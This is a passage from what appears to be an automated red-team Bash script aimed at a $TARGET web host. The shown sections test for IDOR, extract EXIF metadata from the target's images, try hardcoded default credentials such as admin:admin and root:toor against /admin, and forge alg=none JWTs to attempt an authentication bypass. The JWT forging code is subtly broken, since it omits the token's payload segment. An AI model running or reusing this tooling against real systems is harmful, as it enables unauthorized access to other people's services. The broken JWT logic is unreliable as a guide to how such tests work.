        local r2=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET/?$param=2" --connect-timeout 8 2>/dev/null)
        [ "$r1" = "200" ] && [ "$r2" = "200" ] && {
            local b1=$(curl -s "https://$TARGET/?$param=1" --connect-timeout 8 2>/dev/null | md5sum | awk '{print $1}')
            local b2=$(curl -s "https://$TARGET/?$param=2" --connect-timeout 8 2>/dev/null | md5sum | awk '{print $1}')
            [ "$b1" != "$b2" ] && echo "IDOR: ?$param" >> "$SESSION/rt/idor_test.txt"
        }
    done
}

rt_13_exif_extract() {
    _section "[RT 13/30] EXIF METADATA EXTRACTION"
    run "Extracting EXIF from images..."
    > "$SESSION/rt/exif_data.txt"
    local urls=$(grep -oiE 'https?://[^"<>[:space:]]+\.(jpg|jpeg|png)' "$SESSION/web/index.html" 2>/dev/null | head -10)
    for url in $urls; do
        local tmp="/tmp/exif_$(date +%s%N | md5sum | head -c 8)"
        curl -sL "$url" --connect-timeout 10 --max-time 15 > "$tmp" 2>/dev/null
        [ -s "$tmp" ] && strings "$tmp" 2>/dev/null | grep -iE "(author|creator|software|gps|copyright)" >> "$SESSION/rt/exif_data.txt"
        rm -f "$tmp"
    done
}

rt_14_default_creds() {
    _section "[RT 14/30] DEFAULT CREDENTIAL TEST"
    run "Testing default credentials..."
    > "$SESSION/rt/default_creds.txt"
    local CREDS=("admin:admin" "admin:password" "root:root" "root:toor" "test:test")
    for cred in "${CREDS[@]}"; do
        local u="${cred%%:*}" p="${cred##*:}"
        local c=$(curl -s -o /dev/null -w "%{http_code}" -u "${u}:${p}" "https://$TARGET/admin" --connect-timeout 8 2>/dev/null)
        [ "$c" = "200" ] && echo "DEFAULT CRED: $cred" >> "$SESSION/rt/default_creds.txt"
    done
}

rt_15_jwt_confusion() {
    _section "[RT 15/30] JWT ALGORITHM CONFUSION"
    run "Testing JWT alg confusion..."
    > "$SESSION/rt/jwt_confusion.txt"
    [ ! -s "$SESSION/auth/jwt_found.txt" ] && return
    local jwt=$(head -1 "$SESSION/auth/jwt_found.txt" 2>/dev/null)
    [ -z "$jwt" ] && return
    local hdr=$(echo "$jwt" | cut -d. -f1 | tr '_-' '/+' | base64 -d 2>/dev/null)
    local mod=$(echo "$hdr" | sed 's/"alg":"[^"]*"/"alg":"none"/' 2>/dev/null | base64 -w0 2>/dev/null | tr '+/' '-_' | tr -d '=')
    [ -n "$mod" ] && {
        local newjwt="${mod}.${jwt##*.}"
        local code=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $newjwt" "https://$TARGET" --connect-timeout 10 2>/dev/null)
        [ "$code" = "200" ] && echo "JWT alg=none bypass" >> "$SESSION/rt/jwt_confusion.txt"
    }
}

